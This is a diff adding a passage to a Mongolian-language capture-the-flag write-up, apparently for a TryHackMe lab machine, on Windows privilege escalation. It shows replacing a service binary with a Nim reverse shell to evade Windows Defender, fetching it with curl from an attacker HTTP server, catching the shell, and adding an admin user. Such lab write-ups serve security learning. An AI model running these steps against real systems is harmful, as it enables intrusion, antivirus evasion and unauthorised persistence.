@@ -74,6 +74,52 @@ sc.exe stop spoofer-scheduler - Унтраах
 sc.exe start spoofer-scheduler - Асаах
 ``
 Тиймээс хэрвээ энэхүү service -г унраагаад оронд нь өөрийнхөө хортой программуудыг ажиллуулаад асаавал ажиллана гэсэн үг юм.
-Гэхдээ Windows defender ажиллах байсан тул код нь илэрсэн тохиолдолд Quarantine хийгдэх тул 
+Гэхдээ Windows defender ажиллах байсан тул код нь илэрсэн тохиолдолд Quarantine хийгдэх тул Windows defender 11 bypass хийх арга олсон.
 
+<p>Тухайн үедээ ажилладаг байгаад одоо засагдсан арга нь .nim болгож reverse shell авах арга бий. </p>
+``https://github.com/Sn1r/Nim-Reverse-Shell/blob/main/rev_shell.nim``
 
+дээрх rev shellийг авч доорх коммандаар spoofer-scheduler.exe гэдэг нэрээр rev_shell.nim -г compile хийнэ. 
+`` nim c -d:mingw --app:gui --opt:speed -o:spoofer-scheduler.exe rev_shell.nim  ``
+
+<p align="center">
+  <img src="https://github.com/Uz169/F.NS357-Machines-writeup/blob/main/Hacksmarter%20THM%20medium/files/5.png">
+</p>
+
+<p>тэгээд</p> 
+sc stop spoofer-scheduler хийж зогсоосноор 
+
+<p>дараа нь өөрийн сервер асааж 
+└─$ python -m http.server 6969
+</p>
+<p align="center">
+  <img src="https://github.com/Uz169/F.NS357-Machines-writeup/blob/main/Hacksmarter%20THM%20medium/files/6.png">
+</p>
+
+<p>
+spoofer-scheduler.exe file -г windows дээр татна.
+</p>
+
+``curl http://10.4.49.166:6969/spoofer-scheduler.exe -o spoofer-scheduler.exe``
+
+кали дээрээ listener асаагаад service ээ асаахад 
+<p align="center">
+  <img src="https://github.com/Uz169/F.NS357-Machines-writeup/blob/main/Hacksmarter%20THM%20medium/files/7.png">
+</p>
+
+reverse shell ээ авна.
+
+Shell нь тогтворгүй холболт удахгүй салаад байсан тул 
+<p align="center">
+  <img src="https://github.com/Uz169/F.NS357-Machines-writeup/blob/main/Hacksmarter%20THM%20medium/files/8.png">
+</p>
+гэсэн admin user үүсгэж ssh ээр хандаж ороод root.txt ээ аваад өөрийн proof.txt -ыг үлдээсэн.
+
+<p align="center">
+  <img src="https://github.com/Uz169/F.NS357-Machines-writeup/blob/main/Hacksmarter%20THM%20medium/files/9.png">
+</p>
+<p align="center">
+  <img src="https://github.com/Uz169/F.NS357-Machines-writeup/blob/main/Hacksmarter%20THM%20medium/files/10.png">
+</p>
+
+Root.txt - буюу hacking-targets - `` CyberLens, Worksmarter, SteelMountain ``
